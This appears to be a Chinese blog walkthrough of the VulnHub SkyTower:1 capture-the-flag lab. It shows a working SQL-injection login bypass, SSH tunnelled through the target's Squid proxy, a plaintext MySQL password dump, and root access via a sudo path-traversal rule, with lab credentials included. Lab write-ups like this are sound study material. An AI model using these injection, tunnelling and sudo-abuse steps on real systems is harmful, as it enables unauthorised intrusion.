---
title: SkyTower-1
author: Creexile
date: 2024-09-29 12:06:36
lastMod: 2025-04-10
summary: 'No.7'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [MySQL, 提权, 工具, 代理, 渗透]
---

# SkyTower: 1

---

No.7

> 来源: [vulnhub靶场-SkyTower:1](https://www.vulnhub.com/entry/skytower-1,96/)
>
> 目标: attack a system using a multi-faceted approach and obtain the "flag".
>
> 提示: You will most likely find that automated tools will not assist you.

## 环境配置

kali: 192.168.56.6

Linux: 192.168.56.101

## 信息收集

- 端口: 22, 80, 3128, 其中22端口有防火墙
- 中间件: Apache 2.2.22, Squid http proxy 3.1.20
- 系统: Linux 3.2-3.16

目录扫描没有任何的结果, 只能是从80下手了, 80也只有一个登录框

尝试sql注入, 发现输入`'`的时候返回mysql的错误信息, 尝试注入:

```
1'|| 1=1 #
```

任意一个为上即可, 发现账号密码`john : hereisjohn`, 且可以得到我们必须通过那个代理(3128)才能访问22端口

![image-20240929105418874](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929105418874.png)

## getshell

需要代理, 请出我们的proxychains工具:

```bash
vim /etc/proxychains4.config
# 注释掉存在的代理, 添加下面的内容
http  192.168.56.101 3128
# 尝试登录, 拿到shell
proxychains ssh john@192.168.56.101 -t "/bin/sh"
```

> `proxychains ssh john@192.168.56.101`不成功的原因可能是登陆之后没有创建一个shell或者被干掉了, 直接退出了

![image-20240929110341140](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929110341140.png)

我这里将会话转移到msf上了, 比较稳定, 就不放图了; 也可以用perl反弹shell

## 提权

- 权限: john, 无sudo权限
- 环境: gcc/cc/python均无
- 系统: Linux SkyTower 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64 GNU/Linux
- 用户: john, sara, william
- MySQL: root root

没法编译脚本, 脚本提权先放一边, 先看看还有什么漏了: 比如MySQL

> MySQL账密可以从`/var/www/login.php`得到

```mysql
show databases;
use SkyTech
show tables;
select * from login
```

明文存储密码; 正好对应三个用户, 试试ssh登录, sara可以登陆而william不行

![image-20240929113650905](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929113650905.png)

```bash
sudo -l
# (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/* 该目录下有root权限, 该目录在根目录下
sudo ls /accounts/../root
# 利用accounts的权限读取root, 有一个flag.txt
sudo cat /accounts/../root/flag.txt
# Congratz, have a cold one to celebrate! root password is theskytower
# 拿到root账密, 登录即可
```

![image-20240929114639882](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240929114639882.png)

## 附录

### sql注入

我是脚本小子, 我将告诉你用下面这个字典同时跑账号密码可以登录80端口

https://github.com/melbinkm/SQL-Injection-Payloads/blob/master/sqli_auth.list

### proxytunnel

隧道代理, 可以映射到本地端口

使用条件: 防火墙禁止DNS和ICMP隧道，只允许代理服务器上网的情景

```bash
proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566
# kali本地5566端口
ssh john@127.0.0.1 -p 5566
# 登录失败
ssh john@127.0.0.1 -p 5566 ls -a
# 输入密码后会返回ls -a的结果
```

抓一下`.bashrc`, 该文件用于操作shell, 发现该文件当 `$-` 包含 `i` 时不执行任何操作，而在不包含 `i` 时退出函数, 也就是无论如何这个shell都是无用的

```bash
case $- in
    *i*) ;;
      *) return;;
esac
```

将其删除即可:

```bash
proxytunnel -p 192.168.56.101:3128 -d 127.0.0.1:22 -a 5566 rm .bashrc
# ssh john@127.0.0.1 -p 5566 rm .bashrc
ssh john@127.0.0.1 -p 5566
```
